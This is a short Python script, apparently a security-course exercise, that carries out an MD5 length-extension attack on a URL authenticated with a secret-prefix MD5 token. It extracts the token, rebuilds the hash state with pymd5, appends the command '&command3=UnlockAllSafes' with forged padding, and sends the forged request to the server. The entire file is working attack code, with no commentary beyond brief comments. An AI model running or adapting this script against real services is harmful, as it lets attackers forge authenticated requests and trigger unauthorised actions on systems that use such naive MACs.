import http.client as httplib
from urllib.parse import urlparse, quote
import sys, re
from pymd5 import md5, padding

url = sys.argv[1]
PASSWORD_LENGTH = 8
EVIL_COMMAND = "&command3=UnlockAllSafes"

# Extract the original token and message
token = url.split('=')[1].split('&')[0]
message = url.split(token)[1][1:]

# Calculate the original message length
original_message_length = PASSWORD_LENGTH + len(message)
bits = (original_message_length + len(padding(original_message_length * 8))) * 8

# Create a new hash
hash = md5(state=token, count=bits)
hash.update(EVIL_COMMAND)
new_token = hash.hexdigest()

# Construct the new URL
parsed_url = urlparse(url)
new_url = f"{parsed_url.path}?token={new_token}&{message}{quote(padding(original_message_length * 8))}{EVIL_COMMAND}"

# make a request to the server
conn = httplib.HTTPConnection(parsed_url.hostname, parsed_url.port)
conn.request("GET", new_url)
print(conn.getresponse().read())